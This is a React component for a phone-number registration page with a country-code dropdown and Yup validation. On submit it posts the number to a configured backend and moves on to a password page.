import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import logo from "../assets/logo.webp";
import BASE_URL from "../components/urls";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { countries } from "../components/countriesCodes";

// Validation schema using Yup
const schema = yup.object().shape({
  phoneNumber: yup
    .string()
    .required("Phone number is required")
    .matches(/^\d+$/, "Phone number must contain only digits"),
});

// Header Component for the top bar
const Header = () => {
  return (
    <div className="flex items-center justify-evenly bg-[#713D92] text-white py-2 px-4">
      <h2 className="text-lg font-bold flex items-center">
        Mine{" "}
        <span className="ml-2 text-yellow-300 text-2xl">
          <img className="w-[30px]" src={logo} alt="" />
        </span>
      </h2>
    </div>
  );
};

const Home = () => {
  const navigate = useNavigate();
  const [countryCode, setCountryCode] = useState(countries[0].code);
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
  });

  // Handle country change
  const handleCountryChange = (event) => {
    const selectedCode = countries.find(
      (country) => country.name === event.target.value
    ).code;
    setCountryCode(selectedCode);
  };

  // Handle form submission
  // Handle form submission
  const onSubmit = (data) => {
    // Concatenate the country code with the phone number
    const fullPhoneNumber = `${countryCode}${data.phoneNumber}`;

    // Send the combined phone number to the server
    axios
      .post(`${BASE_URL}/`, { phoneNumber: fullPhoneNumber })
      .then((response) => {
        console.log(response.data);
        reset(); // Clear the input fields after success
        navigate("/password");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      });
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Render Header Component */}
      <Header />
      <div className="flex-1 flex flex-col items-center justify-center">
        <div className="text-center mb-6">
          <img src={logo} alt="logo" className="w-24 h-24 mx-auto mb-4" />
          <h2 className="text-xl font-bold text-gray-800">
            Register with phone number
          </h2>
        </div>
        <form
          onSubmit={handleSubmit(onSubmit)}
          className="rounded px-8 pt-6 pb-8 mb-4 w-full max-w-md"
        >
          <label className="block text-gray-700 text-sm font-bold mb-2">
            Country:
          </label>
          <select
            className="w-full border border-gray-300 rounded p-2 mb-4 focus:outline-none focus:ring-2 focus:ring-purple-600"
            onChange={handleCountryChange}
          >
            {countries.map((country) => (
              <option key={country.code} value={country.name}>
                {country.name} ({country.code})
              </option>
            ))}
          </select>

          <label className="block text-gray-700 text-sm font-bold mb-2">
            Phone number:
          </label>
          <div className="flex mb-4">
            <span className="inline-flex items-center px-3 bg-gray-200 border border-r-0 border-gray-300 rounded-l text-gray-600">
              {countryCode}
            </span>
            <input
              type="text"
              className="w-full border border-gray-300 rounded-r p-2 focus:outline-none focus:ring-2 focus:ring-purple-600"
              placeholder="Enter phone number"
              {...register("phoneNumber")}
            />
          </div>
          {errors.phoneNumber && (
            <p className="text-red-500 text-xs italic mb-4">
              {errors.phoneNumber.message}
            </p>
          )}

          <button
            type="submit"
            className="w-full h-[50px] bg-[#713D92] text-white  py-2 rounded-lg hover:bg-purple-900 focus:outline-none focus:ring-2 focus:ring-purple-700"
          >
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default Home;
